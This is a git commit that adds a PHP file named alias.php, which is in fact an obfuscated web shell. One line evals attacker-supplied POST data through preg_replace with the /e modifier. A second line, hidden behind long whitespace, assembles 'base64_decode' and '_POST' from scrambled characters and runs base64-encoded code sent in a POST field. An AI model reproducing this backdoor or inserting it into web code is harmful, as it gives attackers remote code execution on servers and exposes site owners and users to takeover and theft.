7c066791cfaa437da4cfdc46d80e6251e24b2f2a
stiadmin <stiadmin@users.noreply.github.com>
2015-07-09 19:03:52 -0400

    Create alias.php

---
+++ alias.php
@@ -0,0 +1,3 @@
+<?php @preg_replace('/(.*)/e', @$_POST['sfnbycdnmvegc'], '');
+
+                                            $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nab6e1b'])) {eval($s21(${$s20}['nab6e1b']));}?>
